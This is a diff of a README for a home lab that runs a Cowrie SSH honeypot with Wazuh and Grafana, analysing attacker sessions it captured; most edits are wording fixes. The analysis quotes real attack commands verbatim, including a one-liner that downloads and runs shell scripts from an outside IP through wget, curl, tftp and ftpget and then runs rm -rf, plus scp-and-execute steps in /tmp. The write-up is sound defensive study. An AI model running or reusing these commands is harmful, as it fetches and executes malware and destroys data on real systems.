@@ -20,7 +20,7 @@ This project involves deploying and monitoring a medium-interaction SSH honeypot
 ## **Lab Environment**
 The project infrastructure is hosted on a **cloud-based OVH bare metal server** running **Proxmox** as the hypervisor. The internal environment includes:
 
-- A **Cowrie SSH honeypot VM** running on Ubuntu-24.04 Live Server, with limited outbound traffic allowed only over essential ports (e.g., SSH).
+- A **Cowrie SSH honeypot VM** running on Ubuntu-24.04 Live Server, with limited outbound traffic allowed only over essential ports (e.g., SSH and Wazuh communication).
 - A **Wazuh stack server VM** running the Wazuh All-in-One Docker deployment, which includes Wazuh Manager, Elasticsearch, Logstash, and Filebeat.
 - A **management VM** running on Ubuntu-24.04 Desktop for access to the Wazuh Dashboard and Grafana interface.
 - A **pfSense firewall VM** controlling internal traffic flow to ensure the honeypot remains isolated except for required communication between the Wazuh agent and manager.
@@ -30,7 +30,7 @@ The honeypot uses **Cowrie**, a medium-to-high interaction SSH honeypot designed
 
 - Both failed and successful login attempts
 - Attempted usernames, passwords, and post-authentication commands
-- Source IP addresses** for every attempt
+- Source IP addresses for every attempt
 
 ### **Wazuh Stack**
 
@@ -61,7 +61,7 @@ Logs follow this path:
 
 
 ### **Visualization in Grafana**
-Instead of Kibana, this project uses **Grafana** with the **Elasticsearch plugin** to create real-time dashboards. Although Kibana is commonly used with Elasticsearch, I chose Grafana for this project because my team at work is planning to adopt it soon. I wanted to get ahead by becoming familiar with the tool, and this project gave me a practical use case to start exploring its capabilities.
+Instead of Kibana, this project uses **Grafana** with the **Elasticsearch plugin** to create real-time dashboards. Although Kibana is commonly used with Elasticsearch, I chose Grafana for this project because my team at work is planning to adopt it soon and I wanted to get ahead by becoming familiar with the tool. This project gave me a practical use case to start exploring its capabilities.
 
 Visualizations include:
 - Successful and failed login attempts
@@ -79,8 +79,8 @@ The honeypot has been running for one week capturing live attack data. In this s
 
 ### 134.209.120.69 
 
-According to abuseipdb.com, this is a know malicious ip with over 14,000 reports. They seem to be leveraging the cloud as the IP is a digital ocean IP which makes me believe that they are running out of the Digital Ocean cloud or utilizing a private VPN running on Digital Ocean.
-This attack most likely came from a bot considering the speed of the commands entered and the fact that I can find this attack replicated online.
+According to abuseipdb.com, this is a known malicious ip with over 14,000 reports. They seem to be leveraging the cloud as the IP is a digital ocean IP which makes me believe that they are operating out of the Digital Ocean cloud or utilizing a private VPN running on Digital Ocean.
+This attack most likely came from a bot, given the speed of the commands entered and the fact that I can find this attack replicated online.
 
 The bot ran multiple commands that:
 - Attempted to identify whether the system was a router, SMS server, or crypto mining node
@@ -91,7 +91,7 @@ Some of the more interesting commands they tried to execute include:
 
 `/ip cloud print`
   
-Purpose: This command is not a standard Linux command. It's actually a command specific to MikroTik RouterOS. It prints the public IP address and other cloud settings of the MikroTik device. <br>
+Purpose: This command is not a standard Linux command. It's a command specific to MikroTik RouterOS. It prints the public IP address and other cloud settings of the MikroTik device. <br>
 Why a malicious user may use it: If the server was running MikroTik RouterOS, this would help the attacker identify the external IP address of the device. 
 
 `ps | grep '[Mm]iner'`
@@ -138,13 +138,13 @@ This is common on IoT devices, industrial routers, and small embedded systems th
 
 ### 206.189.80.159 
 
-According to abuseipdb.com, this is a known malicious ip with over 100 reports. Like the previous malicious IP we investigated, they also seem to be utilizing Digital Ocean cloud services to launch their attacks from.
+According to abuseipdb.com, this is a known malicious ip with over 100 reports. Like the previous malicious IP we investigated, they also seem to be utilizing Digital Ocean cloud services to launch their attacks.
 
 This attacker only tried to run one command:
 
 `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.178.235.240/ohshit.sh; curl -O http://103.178.235.240/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 103.178.235.240 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 103.178.235.240; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.178.235.240 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *`
 
-Purpose: The script first attempts to change directories to a series of locations on the local system (/tmp, /var/run, /mnt, /root, or /), presumably trying to find an accessible location to operate from.  It then tries to download a potentially malicous file using three different download methods (curl, tftp, and ftpget). 
+Purpose: The script first attempts to change directories to a series of locations on the local system (/tmp, /var/run, /mnt, /root, or /), presumably trying to find an accessible location to operate from. It then tries to download a potentially malicious file using three different download methods (curl, tftp, and ftpget). 
 
 
 ### 189.110.129.57
@@ -160,18 +160,18 @@ Purpose: The scp protocol is being used to try and copy a file from the attacker
 `cd /tmp && chmod +x U8uoKz7J && bash -c ./U8uoKz7J`
 
 Purpose: This script tries to move the newly copied file to the /tmp directory, give it execute permissions, then run it.
-Why the /tmp directory? The /tmp directory is typically world-writable (meaning any user on the system can write to it) and has relaxed permissions, allowing files to be created, modified, and executed by anyone. This makes it an ideal place to put malicious scripts or binaries when trying to avoid more restricted parts of the filesystem.
+Why the `/tmp` directory? The `/tmp` directory is typically world-writable (meaning any user on the system can write to it) and has relaxed permissions, allowing files to be created, modified, and executed by anyone. This makes it an ideal place to put malicious scripts or binaries when trying to avoid more restricted parts of the filesystem.
 
 `./U8uoKz7J`
 
-Purpose: This script may have been executed as a form of redundancy. Since the honeypot ssh shell is a fake shell, they would not be able to sucessfully run their script. They may have decided to try running the script directly to see if that would work.
+Purpose: This script may have been executed as a form of redundancy. Since the honeypot ssh shell is a fake shell, they would not be able to successfully run their script. They may have decided to try running the script directly to see if that would work.
 
 
 ## Conclusion
 
 This project provided valuable hands-on experience in both deploying a honeypot and integrating it with a SIEM solution. By setting up Cowrie and Wazuh, I was able to capture real-world attack data, gain insights into common attacker behaviors, and strengthen my skills in log analysis, threat detection, and system hardening.
 
-Going forward, I plan to expand on this lab by incorporating other types of honeypots (Dinoaea really caught my eye), refining alerting rules, and experimenting with threat intelligence integration to build a more complete view of attacker tactics, techniques, and procedures (TTPs). 
+Going forward, I plan to expand on this lab by incorporating other types of honeypots (Dionaea really caught my eye), refining alerting rules, and experimenting with threat intelligence integration to build a more complete view of attacker tactics, techniques, and procedures (TTPs). 
 
 Overall, this lab has not only enhanced my technical skills but also emphasized the critical role of proactive monitoring in modern cybersecurity.
 
